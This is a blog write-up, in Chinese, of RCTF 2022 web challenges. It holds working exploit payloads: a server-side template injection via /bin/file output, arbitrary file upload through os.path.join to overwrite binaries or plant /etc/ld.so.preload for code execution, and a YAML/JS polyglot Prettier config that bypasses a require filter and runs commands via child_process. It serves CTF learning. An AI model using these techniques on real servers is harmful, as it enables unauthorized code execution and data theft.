---
title: RCTF 2022 筆記
catalog: true
date: 2022-12-14 20:10:44
tags: [Security]
categories: [Security]
---

<img src="/img/rctf-2022-writeup/cover.png" style="display:none">

簡單記一些自己有打的題目，沒有打的就不記了。

依照慣例先附上關鍵字：

1. Python os.path.join 的利用
2. YAML & JS polyglot
3. strace & LD_PRELOAD

<!-- more -->

## filechecker 系列

### mini

程式碼：

``` py
from flask import Flask, request, render_template, render_template_string
from waitress import serve
import os
import subprocess

app_dir = os.path.split(os.path.realpath(__file__))[0]
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = f'{app_dir}/upload/'

@app.route('/', methods=['GET','POST'])
def index():
    try:
        if request.method == 'GET':
            return render_template('index.html',result="ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿")

        elif request.method == 'POST':
            f = request.files['file-upload']
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename)

            if os.path.exists(filepath) and ".." in filepath:
                return render_template('index.html', result="Don't (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)")
            else:
                f.save(filepath)
                file_check_res = subprocess.check_output(
                    ["/bin/file", "-b", filepath], 
                    shell=False, 
                    encoding='utf-8',
                    timeout=1
                )
                os.remove(filepath)
                if "empty" in file_check_res or "cannot open" in file_check_res:
                    file_check_res="wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ"
                return render_template_string(file_check_res)

    except:
        return render_template('index.html', result='Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ')

if __name__ == '__main__':
    serve(app, host="0.0.0.0", port=3000, threads=1000, cleanup_interval=30)
```

簡單來說就是你上傳一個檔案，server 儲存以後會用 `/bin/file` 去檢查，並且把輸出丟給 `render_template_string`。也就是說我們只要能控制輸出就能輕鬆 SSTI。

當時我就直接跑去 file 的 Github 找測試，看有沒有可以用的，最後找到這個：https://github.com/file/file/blob/master/tests/escapevel.result

可以看到跑出來的結果包含一個 MIME type，這個 MIME type 存在於原始檔案中，所以修改一下就好了。

看到別人 writeup，發現其實這樣就好了，最簡單：

```
#!/testabc haha{{7+7}}
```

出來的結果會是：

```
a /testabc haha{{7+7}} script text executable, ASCII text, with no line terminators
```

### plus

接著是加強版，程式碼跟剛剛差不多，唯一的差別只有結果不會丟到 `render_template_string`，所以無法 SSTI。

當初這題看了好一陣子，原本我猜這題會跟 file 怎麼運作有關，想說應該會跟他怎麼判斷類型（magic/libmagic）有關，然後想辦法把 flag 檔案當作輸入外加自己寫的判斷，就可以慢慢去 leak file content 之類的。

結果隊友發現這一段有洞：

``` py
filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename)
if os.path.exists(filepath) and ".." in filepath:
```
Python 的這個行為滿有趣的，那就是`os.path.join` 第二個參數如果是 `/` 開頭，他做的事情就不是 join 了：

``` py
os.path.join("/tmp/a/", "b") # /tmp/a/b
os.path.join("/tmp/a/", "/b") # /b
```

因此可以不需要有 `..` 就把檔案上傳到任意地方，只要隨便寫個 C program 把 `/bin/file` 蓋掉就好了。

### promax

這題把剛剛的漏洞修了一半，變成只要檔案存在就不讓你上傳，所以不能蓋掉，只能上傳新東西。

此時我們還是往上一題之前想的方向去找，看怎麼運用現有機制，結果另一個隊友說他有個可能是非預期的解法，就解掉了。

原理是可以上傳檔案到 `/etc/ld.so.preload`，裡面內容放 `/tmp/a.so` 之類的，然後再上傳另一個檔案到 `/tmp/a.so`，此時 binary 在執行前就會先載入裡面的程式碼。

這邊記一下 DC 裡面 lavish 的詳細回答：

1. `os.path.join(app.config['UPLOAD_FOLDER'], f.filename)` allows for arbitrary file upload when f.filename is an absolute path.
2. unlike filechecker_plus, you can't now overwrite existing files such as `/bin/file`, so you have to identify a way to obtain RCE by uploading a file that does not previously exist on the filesystem
3. if you strace an execution of `/bin/file`, you will notice that it tries to open (like any other executable) the `/etc/ld.so.preload` file. Have a look with `strace file -b <whatever> |& grep ENOENT` -> `access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)`
4.  `/etc/ld.so.preload` is used to specify a list of shared libraries that are preloaded when any executable is run
5. at this point, you need to craft an .so that prints the flag, upload it to a random location on the fs, upload a `/etc/ld.so.preload` containing the path to your .so and execute file again so that the flag is returned
6. since files are deleted after being uploaded, you need to exploit a race condition. You should also ensure that  file does a clean exit, otherwise subprocess.check_output will raise an exception

以前其實沒用過 strace，發現還滿好用的，簡單記錄一下用法：

1. `strace file -b <whatever> |& grep ENOENT`
2. `strace file /etc/passwd 2>&1 | grep "No such file or directory"`

可以看到呼叫了哪些 system call & 去動了哪些檔案

因為這個解法似乎跟 file 沒太大關係，導致我們一直認為是非預期，最後發現其實是預期解。

作者 writeup：https://github.com/L1aovo/my-ctf-challenges/tree/main/RCTF2022

## PrettierOnline

先說結論，我滿喜歡這題的

主要程式碼在這邊：

``` js
const fs = require('fs')
const crypto = require('crypto')
const prettier = require('prettier')
const { nextTick, exit } = require('process')
require('./fw')

const id = fs.readFileSync('./dist/id', 'utf-8').toString('utf-8').trim()
fs.unlinkSync('./dist/id')
prettier.resolveConfig(`${__dirname}/.prettierrc`).then(config => {
  const ret = prettier.format(fs.readFileSync(__filename, 'utf-8'), config)
  const o = crypto.createHash('sha256').update(Buffer.from(id, 'utf-8')).digest().toString('hex')
  fs.writeFileSync(`./dist/${id}`, o, 'utf-8')
  fs.writeFileSync('./dist/ret.js', ret, 'utf-8')
  nextTick(() => {
    throw new Error('No NextTick here!')
  })
  exit(0)
})
```

簡單來說就是載入設定檔以後跑 prettier，這題你唯一能控制的就是這個設定檔。

然後 `./fw.js` 裡面是去 patch `require`：

``` js
const Module = require('module')
const oldRequire = Module.prototype.require
Module.prototype.require = function (id) {
  if (typeof id !== 'string') {
    throw new Error('Bye')
  }
  const isCore = Module.isBuiltin(id)
  if (isCore) {
    if (!/fs|path|util|os/.test(id)) {
      throw new Error('Bye, ' + id)
    }
  } else {
    id = Module._resolveFilename(id, this)
  }
  return oldRequire.call(oldRequire, id)
}
process.dlopen = () => {}
```

既然是有關 prettier config，第一步當然是先看官方文件：https://prettier.io/docs/en/configuration.html

當時有點看到幾個點：

1. 支援 YAML
2. 有一個 Sharing configurations 的東西，只放一個字串就會改成去 require 那個字串

第二點例如說你的 `.prettierrc` 長這樣：

```
hello
```

跑 prettier 的時候就會出現：`Error: Cannot find module 'hello'`

但因為 server 上也沒其他檔案可以控制，所以沒發現可以幹嘛，就繼續研究 prettier 到底做了什麼事情，花了一些時間開 debugger 去 trace，發現就算你丟的是 JSON，一樣是先走到 `yaml.parse` 去解析你的程式碼（沒什麼用的發現就是了）

後來東看西看，發現外加想起來有 plugin 這種東西，就寫了這樣的設定檔：

```
{
  "plugins": ["abc"]
}
```

出現錯誤訊息 `Error: Cannot find module 'abc'`，代表 prettier 會去 require plugin 沒有錯。

那我們要 require 什麼？此時我想到我們可以 require 唯一能控制的檔案：`.prettierrc`，也就是說如果 `.prettierrc` 同時是設定檔又是 JS 就行了。

幸好這在 yaml 裡面很容易：

``` yaml
plugins:
  - ".prettierrc"
abc:
  - console.log(1)
```

`plgusin:` 在 JS 裡面是標籤，`-` 是減號，所以完全沒問題。做到這裡我就覺得這題滿有趣的，把 JS+yaml polyglot 這概念再加上 real world 的 prettier 當作範例。

可以執行程式碼以後，就要看怎麼繞 require 的限制，我試過 `import()` 但沒作用，後來想了一下，既然都可以執行任意 JS，就隨便亂改一波就好了，像這樣：

``` yaml
plugins:
  - ".prettierrc"
abc:
  - eval("h=RegExp.prototype.test;RegExp.prototype.test=function(v){return v == 'child_process' ? true : h.call(this,v)};f=require('child_process').execSync('/readflag').toString();fs=require('fs');w=fs.writeFileSync;fs.writeFileSync=function(a,b,c){ if(a=='./dist/ret.js'){b=f}; return w.call(fs,a,b,c) }")
```

好讀版：

``` js
h = RegExp.prototype.test;
RegExp.prototype.test = function(v){
 return v == 'child_process' ? true : h.call(this,v)
};

f = require('child_process').execSync('/readflag').toString();

fs = require('fs');
w = fs.writeFileSync;
fs.writeFileSync=function(a,b,c){
  if(a == './dist/ret.js'){
    b = f
  };
  return w.call(fs,a,b,c)
}
```

先把 `RegExp.test` 改掉，就可以 require 任意東西，接著再讓 `fs.writeFileSync` 的時候內容會被換成 flag，最後就能拿到 flag 了。

作者 writeup：https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2022/prettieronline

發現 require 根本不用繞，用 `module.constructor._load('child_process')` 其實就可以了，因為 require 裡面也是再去呼叫這個 _load 的方法：https://github.com/nodejs/node/blob/265ea1e74ef429f7c27f05ac4cc9136adf2e8d9b/lib/internal/modules/cjs/loader.js

``` js
// Loads a module at the given file path. Returns that module's
// `exports` property.
Module.prototype.require = function(id) {
  validateString(id, 'id');
  if (id === '') {
    throw new ERR_INVALID_ARG_VALUE('id', id,
                                    'must be a non-empty string');
  }
  requireDepth++;
  try {
    return Module._load(id, this, /* isMain */ false);
  } finally {
    requireDepth--;
  }
};
```

最後還有一個 Nu1L 的 payload 也很炫：

```
/*/../app/.prettierrc
#*/const fs = require('fs'); var a = fs.readFileSync("flag", "utf-8");fs.writeFileSync("./dist/ret.js",a);fs.chmodSync("./dist/ret.js",0o444);process.addListener('uncaughtException', (err) => {console.log("ss",err);process.exit(0);})
```

這個利用了我開頭講的輸出一個字串就會 require，背後也是先用 yaml parse 所以 `#` 後面是註解，然後路徑的部分用了 `/*` 搭配第二行的 `*/` 結合變成合法 JS，tql！


最後附上其他有找到的 writeup：

1. [RCTF 2022 WriteUp By F61d](https://www.ctfiot.com/85535.html)
2. [2022RCTF WriteUp by Venom](https://cn-sec.com/archives/1460829.html)


